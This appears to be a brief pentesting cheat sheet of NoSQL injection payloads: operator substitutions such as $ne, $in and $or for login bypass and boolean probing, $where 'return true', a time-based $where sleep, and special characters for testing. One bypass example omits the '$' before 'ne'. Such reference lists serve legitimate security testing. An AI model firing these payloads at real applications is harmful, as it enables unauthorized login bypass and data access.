NoSQL Payload
========================================

Common Payload
----------------------------------------
- Bypass restrictions
    - ``{"username": "user"}`` => ``{"username": {"ne": "fakeuser"}}``
    - ``{"$where":  "return true"}``
- Characters for testing
    - ``'"\/$[].>``
- Commonly used in Boolean testing
    - ``{"$ne": -1}``
    - ``{"$in": []}``
    - ``{"$where":  "return true"}``
    - ``{"$or": [{},{"foo":"1"}]}``
- time
    - ``{"$where":  "sleep(100)"}``
